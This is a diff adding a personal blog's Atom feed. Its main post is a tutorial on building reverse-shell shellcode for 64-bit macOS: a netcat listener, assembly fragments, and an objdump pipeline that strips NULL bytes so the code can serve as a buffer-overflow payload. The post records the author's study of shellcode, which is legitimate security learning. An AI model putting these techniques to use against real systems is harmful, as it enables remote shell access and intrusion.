@@ -1,0 +1,120 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Lodakai's corner]]></title>
+  <link href="http://chrjoh.github.io/atom.xml" rel="self"/>
+  <link href="http://chrjoh.github.io/"/>
+  <updated>2014-05-20T21:05:39+02:00</updated>
+  <id>http://chrjoh.github.io/</id>
+  <author>
+    <name><![CDATA[Christer Johansson]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Reverse shell]]></title>
+    <link href="http://chrjoh.github.io/blog/2014/05/20/reverse-shell/"/>
+    <updated>2014-05-20T20:22:22+02:00</updated>
+    <id>http://chrjoh.github.io/blog/2014/05/20/reverse-shell</id>
+    <content type="html"><![CDATA[<h1>reverse_shell</h1>
+
+<p>My first attempt was to write a reverse shell to be used in Mac OSX 64-bit system, one of the first obstacles was to find the header file
+with the id for syscalls. After some google I found an excellent page with them
+<a href="http://www.opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master" title="syscalls">here</a>. The first steep was to write some
+c code that did the same job and from that deduce the correct order of the syscalls. This resulted in the file reverse_shell.s,
+and keep in mind that in 64-bit the calls need to be in the form, <code>0x2000061</code> for the syscall <code>61</code>. The complete code for
+<a href="https://github.com/chrjoh/shell_code/blob/master/reverse_shell/reverse_shell.s" title="reverse_shell.s">reverse_shell.s</a>.
+The <a href="http://cocoafactory.com/blog/2012/11/23/x86-64-assembly-language-tutorial-part-1/">page</a>
+have a good description of the registers and the naming it also include a tutorial to assembly programming. The first order of business
+is to change from the nasm that apple supply, go to
+<a href="http://www.nasm.us/pub/nasm/releasebuilds/2.11.02/macosx/">nasm download osx</a> and download the macox version.</p>
+
+<h4>reverse_shell, Usage:</h4>
+
+<p>  Program that call out to a service that is listening to port 4444, the ip is set to any for simplicity.
+  It is written for mac osx 64 bit</p>
+
+<p>  Start a listening server with the command: <code>nc -l 4444</code> in another folder for example your home directory</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>  nasm -g -f macho64 reverse_shell.s
+</span><span class='line'>  ld  -arch x86_64 -macosx_version_min 10.7.0 -lSystem -o reverse_shell reverse_shell.o
+</span><span class='line'>  ./reverse_shell</span></code></pre></td></tr></table></div></figure>
+
+
+<p>
+To use the code as a string payload, one need to remove the NULL bytes, these can be found by running: otool -lV reverse_shell and identify
+the mov instructions that need to be modified. The reason are the numerous NULL bytes (\x00).
+Most buffer overflow errors are related to C stdlib string functions: strcpy(), sprintf(), strcat(),
+and so on. All of these functions use the NULL symbol to indicate the end of a string.
+Therefore, a function will not read shellcode after the first occurring NULL byte.
+There are other delimiters like linefeed (0x0A), carriage return (0x0D), 0xFF, and others.</p>
+
+<h4>Binary to string</h4>
+
+<p>To convert the binary to string values that can be used as a payload use</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>  gobjdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g' &gt; dump.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>  By inspecting this file, we see quite few NULL(0x00) and these has to be removed
+  A simple <code>paste -d'\0' -s dump.txt</code> will combine all rows into one that can then be copied into the C file.
+  Ànother way to find bad values is:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> gobjdump -D reverse_shell -M intel |grep 00</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p>By using the above and to find the problematic instructions and that most of them include the <code>mov</code> instruction and that the data we move
+is stored in the lowest byte of the 64-bit registers. We can use <code>mov dil, 2</code> instead of <code>mov rdi, 2</code>. Using this and that we can construct
+the syscall setuid <code>mov rax, 0x2000017</code> by using the following instructions</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> mov r8b, 0x02               ; unix class system calls = 2
+</span><span class='line'> shl r8, 24                  ; shift left 24 to the upper order bits
+</span><span class='line'> or r8, 0x17                 ; setreuid is 0x17
+</span><span class='line'> mov rax, r8                 ; put setreuid syscall # into rax</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The last part is now to get rid of the NULL terminated string <code>db '/bin/sh', 0</code> this we do by using a simple ruby command
+(remember that osx is little endian)</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>  "/bin//sh".unpack('H*')
+</span><span class='line'>  =&gt; ["2f62696e2f2f7368"] and that give us the value to use as: 0x68732f2f6e69622f</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The result of doing these manipulations can be found in
+<a href="https://github.com/chrjoh/shell_code/blob/master/reverse_shell/reverse_shell_no_bad_values.s" title="reverse_shell_no_bad_values.s">reverse_shell_no_bad_values.s</a>
+A more simple command to use is the osx otool, <code>otool -t reverse_shell_no_bad_values.o</code> to generate the hex values we need to be able to
+test our reverse_shell code in a simple c-program,
+<a href="https://github.com/chrjoh/shell_code/blob/master/reverse_shell/reverse_shell_test.c" title="reverse_shell_test.c">reverse_shell_test.c</a>.
+Start your netcat server <code>nc -l 4444</code> then run the c code and it should call out to you can check that it works by doing some normal
+shell commands. To simplify the compilation you can use the supplied Makefile.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[First post]]></title>
+    <link href="http://chrjoh.github.io/blog/2014/05/20/first-post/"/>
+    <updated>2014-05-20T20:01:11+02:00</updated>
+    <id>http://chrjoh.github.io/blog/2014/05/20/first-post</id>
+    <content type="html"><![CDATA[<p>This is the first post using octopress, started the blog to document my path into shell code programming and other security related.
+Will try to describe my progress and difficulties I encounter during the way, maybe include some standard programs, like how to develop
+a module for nginx(found that there is not an abundance of information about that). Other interests is developing in ruby on rails so will
+try to include something about that to.</p>
+]]></content>
+  </entry>
+  
+</feed>
